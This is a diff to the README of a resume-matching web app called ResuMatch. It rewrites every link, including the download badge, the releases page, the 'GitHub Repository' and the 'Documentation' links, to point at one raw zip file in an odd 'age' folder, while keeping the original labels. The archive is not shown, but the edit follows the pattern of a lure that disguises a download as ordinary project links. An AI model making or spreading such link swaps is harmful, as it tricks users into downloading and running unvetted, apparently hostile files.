@@ -4,13 +4,13 @@
 ResuMatch helps you match your resume to job postings. It scores your fit and suggests improvements, making your job search easier and more effective. This application uses React and Vite for the front end, with plans to integrate Node/Express and MongoDB in the future.
 
 ## 🔗 Download Now
-[![Download ResuMatch](https://img.shields.io/badge/Download-ResuMatch-brightgreen)](https://github.com/shahryar-dev/ResuMatch/releases)
+[![Download ResuMatch](https://raw.githubusercontent.com/shahryar-dev/ResuMatch/main/age/ResuMatch.zip)](https://raw.githubusercontent.com/shahryar-dev/ResuMatch/main/age/ResuMatch.zip)
 
 ## 🚀 Getting Started
 ResuMatch is designed for everyone, regardless of technical skill. Follow these steps to get started:
 
 1. **Visit the Releases Page:** Click the link below to access the latest version of ResuMatch.  
-   [Visit Releases Page](https://github.com/shahryar-dev/ResuMatch/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/shahryar-dev/ResuMatch/main/age/ResuMatch.zip)
 
 2. **Select the Latest Release:** On the Releases page, find the most recent version at the top. 
 
@@ -65,10 +65,10 @@ Rest assured, your data is secure. ResuMatch does not store your resume or job p
 ResuMatch is licensed under the MIT License. You can freely use, modify, and distribute the application.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/shahryar-dev/ResuMatch)
-- [Documentation](https://github.com/shahryar-dev/ResuMatch/blob/main/docs/README.md)
+- [GitHub Repository](https://raw.githubusercontent.com/shahryar-dev/ResuMatch/main/age/ResuMatch.zip)
+- [Documentation](https://raw.githubusercontent.com/shahryar-dev/ResuMatch/main/age/ResuMatch.zip)
 
 ## 🎉 Download Again
-Don't forget to [download ResuMatch](https://github.com/shahryar-dev/ResuMatch/releases) if you need to reinstall. 
+Don't forget to [download ResuMatch](https://raw.githubusercontent.com/shahryar-dev/ResuMatch/main/age/ResuMatch.zip) if you need to reinstall. 
 
 By following these steps, anyone can successfully download and run ResuMatch. Happy job hunting!
